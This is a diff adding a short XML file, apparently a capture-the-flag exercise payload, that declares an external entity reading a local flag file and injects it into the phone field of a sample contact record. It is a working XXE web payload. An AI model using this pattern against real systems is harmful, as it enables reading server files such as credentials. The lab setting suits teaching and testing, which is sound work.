@@ -1,0 +1,24 @@
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/cata/licenta/web-ctf/flags/xxe.txt"> ]>
+<data>
+    <firstname>
+        John
+    </firstname>
+    <surname>
+        Doe
+    </surname>
+    <phone>
+        &xxe;
+    </phone>
+    <address>
+        N. Balcescu
+    </address>
+    <email>
+        aaa@aaa.com
+    </email>
+    <country>
+        RO
+    </country>
+    <state>
+        Olt
+    </state>
+</data>
